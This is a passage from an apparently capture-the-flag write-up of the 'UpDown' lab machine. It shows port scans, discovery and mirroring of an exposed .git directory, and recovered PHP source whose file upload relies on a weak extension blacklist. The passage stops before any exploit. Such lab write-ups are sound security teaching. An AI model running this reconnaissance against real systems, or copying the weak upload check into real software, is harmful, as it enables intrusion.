background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.129.5.88</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-5"></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.129.5.88</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3072</span> 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    Apache httpd 2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">))</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Is my Website up <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Apache/2.4.41 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span></code></pre></div>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">==</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> DIRECTORY: http://10.129.5.88/dev/                                                                                                                       </span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.129.5.88/index.php <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:1131</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                          </span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.129.5.88/server-status <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:403</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:276</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                       </span>
<span id="cb2-4">                                                                                                                                                             </span>
<span id="cb2-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----</span> Entering directory: http://10.129.5.88/dev/ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span></span>
<span id="cb2-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.129.5.88/dev/.git/HEAD <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:21</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                                                        </span>
<span id="cb2-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span> http://10.129.5.88/dev/index.php <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CODE:200</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SIZE:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>     </span></code></pre></div>
<p>Visiting the webservice on port 80 we find a site that lets us check if a website is Up or Down. In the footer we find the domain <code>siteisup.htb</code>, add it to <code>/etc/hosts</code></p>
<p><img src="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown01.png" class="img-fluid"></p>
<p>As dirbuster found a <code>.git</code> directory, that also have directory listing, we can simply download all the files using wget:</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown wget <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--mirror</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-I</span> /dev/.git siteisup.htb/dev/.git/</span></code></pre></div>
<p>Changing directory to the <code>/dev</code> folder, our zsh shell tells us that we’re now in a git-tracked directory (see the ‘main’-branch hint).</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  .git git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">pwd</span></span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/htb/updown/siteisup.htb/dev/</span></span></code></pre></div>
<p>We can from here run git-commands, find changes and restore files.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">✗</span> git status</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">On</span> branch main</span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Your</span> branch is up to date with <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'origin/main'</span>.</span>
<span id="cb5-4"></span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Changes</span> not staged for commit:</span>
<span id="cb5-6">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">use</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"git add/rm &lt;file&gt;..."</span> to update what will be committed<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb5-7">  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">use</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"git restore &lt;file&gt;..."</span> to discard changes in working directory<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb5-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    .htaccess</span>
<span id="cb5-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    admin.php</span>
<span id="cb5-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    changelog.txt</span>
<span id="cb5-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    checker.php</span>
<span id="cb5-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    index.php</span>
<span id="cb5-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">deleted:</span>    stylesheet.css</span>
<span id="cb5-14"></span>
<span id="cb5-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> restore admin.php changelog.txt checker.php .htaccess index.php stylesheet.css</span>
<span id="cb5-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> status</span>
<span id="cb5-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">On</span> branch main</span>
<span id="cb5-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Your</span> branch is up to date with <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'origin/main'</span>.</span>
<span id="cb5-19"></span>
<span id="cb5-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nothing</span> to commit, working tree clean</span>
<span id="cb5-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb5-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 40</span>
<span id="cb5-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 3 void void 4096 Sep  6 10:00 .</span>
<span id="cb5-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 3 void void 4096 Sep  6 09:55 ..</span>
<span id="cb5-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void   59 Sep  6 10:00 admin.php</span>
<span id="cb5-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void  147 Sep  6 10:00 changelog.txt</span>
<span id="cb5-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void 3145 Sep  6 10:00 checker.php</span>
<span id="cb5-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 8 void void 4096 Sep  6 10:00 .git</span>
<span id="cb5-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void  117 Sep  6 10:00 .htaccess</span>
<span id="cb5-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void  273 Sep  6 10:00 index.php</span>
<span id="cb5-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 void void 5531 Sep  6 10:00 stylesheet.css</span></code></pre></div>
<p>Looking through the files we find that there’s probably a upload function somewhere:</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> changelog.txt</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Beta</span> version</span>
<span id="cb6-3"></span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1-</span> Check a bunch of websites.</span>
<span id="cb6-5"></span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">--</span> ToDo:</span>
<span id="cb6-7"></span>
<span id="cb6-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1-</span> Multithreading for a faster version :D.</span>
<span id="cb6-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2-</span> Remove the upload option.</span>
<span id="cb6-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3-</span> New admin panel.</span></code></pre></div>
<p>Interesting source code from <code>checker.php</code>:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> checker.php</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb7-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">function</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;"> isitup</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">){</span></span>
<span id="cb7-4">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=curl_init</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_URL, trim<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span></span>
<span id="cb7-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_USERAGENT, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"siteisup.htb beta"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_HEADER, 1<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_FOLLOWLOCATION, 1<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_RETURNTRANSFER, 1<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_SSL_VERIFYHOST, 0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_SSL_VERIFYPEER, 0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_setopt</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> CURLOPT_TIMEOUT, 30<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-13">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$f</span> = curl_exec<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-14">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$header</span> = curl_getinfo<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-15">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$f</span> AND <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$header</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'http_code'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> == 200<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">){</span></span>
<span id="cb7-16">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">array</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">true</span>,<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$f</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-17">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}else{</span></span>
<span id="cb7-18">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">return</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">false</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-19">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-20">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl_close</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ch</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-22"></span>
<span id="cb7-23"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_POST</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'check'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">){</span></span>
<span id="cb7-24">  </span>
<span id="cb7-25">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># File size must be less than 10kb.</span></span>
<span id="cb7-26">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_FILES</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'file'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">][</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'size'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 10000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb7-27">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">die</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"File too large!"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-28">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-29">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$file</span> = <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_FILES</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'file'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">][</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'name'</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-30">    </span>
<span id="cb7-31">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Check if extension is allowed.</span></span>
<span id="cb7-32">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ext</span> = getExtension<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$file</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-33">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">preg_match</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$ext</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)){</span></span>
<span id="cb7-34">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">die</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Extension not allowed!"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-35">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-36">  </span>
<span id="cb7-37">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Create directory to upload our file.</span></span>
<span id="cb7-38">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$dir</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"uploads/"</span>.md5<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">time()</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.</span><span class="st" style="color: #20794D;
background-color: null;
